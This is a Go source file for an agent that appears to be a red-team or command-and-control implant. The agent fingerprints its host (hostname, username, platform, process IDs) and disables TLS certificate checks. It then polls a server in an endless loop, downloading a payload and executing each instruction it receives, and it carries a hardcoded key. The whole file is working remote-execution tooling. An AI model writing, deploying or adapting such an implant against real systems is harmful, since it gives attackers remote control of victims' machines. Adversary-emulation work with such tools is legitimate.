package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"time"

	"strconv"

	"./api"
	"./execute"
	"./util"
)

var iteration = 10

func askForInstructions(profile map[string]string) {
	commands := api.Instructions(profile)
	if commands != nil && len(commands.([]interface{})) > 0 {
		cmds := reflect.ValueOf(commands)
		for i := 0; i < cmds.Len(); i++ {
			cmd := cmds.Index(i).Elem().String()
			fmt.Println("[*] Running instruction")
			command := util.Unpack([]byte(cmd))
			api.Drop(profile["server"], command["payload"].(string))
			api.Execute(profile, command)
		}
	} else {
		time.Sleep(time.Duration(iteration) * time.Second)
	}
}

func buildProfile(server string, group string, executor string) map[string]string {
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)
	return map[string]string{"paw": paw, "server": server, "group": group, "platform": runtime.GOOS, "executor": executor,
		"location": os.Args[0], "pid": strconv.Itoa(os.Getpid()), "ppid": strconv.Itoa(os.Getppid())}

}

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
	group := flag.String("group", "my_group", "Attach a group to this agent")
	executor := flag.String("executor", execute.DetermineExecutor(runtime.GOOS), "Attach a group to this agent")
	flag.Parse()

	profile := buildProfile(*server, *group, *executor)
	for {
		askForInstructions(profile)
	}
}

var key = "3TEU4UD15V29OBJB7U9HNCR2JPWL1U"
